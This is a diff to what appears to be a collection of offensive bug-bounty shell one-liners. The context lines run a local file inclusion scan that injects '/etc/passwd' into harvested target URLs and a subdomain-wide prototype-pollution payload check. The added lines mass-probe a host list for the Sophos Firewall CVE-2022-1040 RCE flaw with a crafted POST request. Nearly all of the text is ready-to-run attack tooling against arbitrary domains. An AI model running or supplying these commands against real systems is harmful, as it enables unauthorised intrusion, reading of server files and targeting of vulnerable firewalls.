@@ -23,3 +23,6 @@ gau <target-domain> | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c '
 
 # Find Prototype Pollution
 subfinder -d <target-domain> -all -silent | httpx -silent -threads 300 | anew -q alive.txt && sed 's/$/\/?__proto__[testparam]=exploit\//' alive.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"
+
+# Sophos Firewall CVE-2022-1040 (RCE) 
+cat sophos_servers | while read host do; do curl --connect-timeout 10 -ks -H "X-Requested-With: XMLHttpRequest" -X POST "https://$host/userportal/Controller?mode=8700&operation=1&datagrid=179&json=\{"👽":"TEST"\}" | grep -q 'Session Expired' && printf "$host \033[1;41mVulnerable a CVE-2022-1040 (Sophos RCE)\e[0m\n"; done; 
